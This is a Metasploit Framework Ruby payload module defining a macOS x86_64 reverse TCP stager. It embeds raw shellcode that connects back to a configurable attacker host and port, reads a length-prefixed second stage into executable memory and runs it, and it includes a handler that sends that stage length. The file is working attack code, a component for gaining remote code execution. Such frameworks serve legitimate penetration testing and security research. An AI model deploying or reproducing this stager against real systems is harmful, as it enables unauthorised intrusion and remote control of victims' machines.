##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'

module Metasploit3
  extend  Metasploit::Framework::Module::Ancestor::Handler

  include Msf::Payload::Stager

  handler module_name: 'Msf::Handler::ReverseTcp'

  def initialize(info = { })
    super(merge_info(info,
      'Name'        => 'Reverse TCP Stager',
      'Description' => 'Connect, read length, read buffer, execute',
      'Author'      => 'nemo <nemo[at]felinemenace.org>',
      'License'     => MSF_LICENSE,
      'Platform'    => 'osx',
      'Arch'        => ARCH_X86_64,
      'Convention'  => 'sockedi',
      'Stager'      =>
      {
        'Offsets' =>
        {
          'LHOST' => [ 37, 'ADDR'],
          'LPORT' => [ 35, 'n']
        },
        'Payload' =>
          "\xb8\x61\x00\x00\x02\x6a\x02\x5f\x6a\x01\x5e\x48" +
          "\x31\xd2\x0f\x05\x49\x89\xc5\x48\x89\xc7\xb8\x62" +
          "\x00\x00\x02\x48\x31\xf6\x56\x48\xbe\x00\x02\x15" +
          "\xb3\x7f\x00\x00\x01\x56\x48\x89\xe6\x6a\x10\x5a" +
          "\x0f\x05\x4c\x89\xef\xb8\x1d\x00\x00\x02\x48\x31" +
          "\xc9\x51\x48\x89\xe6\xba\x04\x00\x00\x00\x4d\x31" +
          "\xc0\x4d\x31\xd2\x0f\x05\x41\x5b\x4c\x89\xde\x81" +
          "\xe6\x00\xf0\xff\xff\x81\xc6\x00\x10\x00\x00\xb8" +
          "\xc5\x00\x00\x02\x48\x31\xff\x48\xff\xcf\xba\x07" +
          "\x00\x00\x00\x41\xba\x02\x10\x00\x00\x49\x89\xf8" +
          "\x4d\x31\xc9\x0f\x05\x48\x89\xc6\x56\x4c\x89\xef" +
          "\x48\x31\xc9\x4c\x89\xda\x4d\x31\xc0\x4d\x31\xd2" +
          "\xb8\x1d\x00\x00\x02\x0f\x05\x58\xff\xd0"
      }
    ))
  end

  def handle_intermediate_stage(conn, p)
    #
    # Our stager payload expects to see a next-stage length first.
    #
    conn.put([p.length].pack('V'))
  end
end
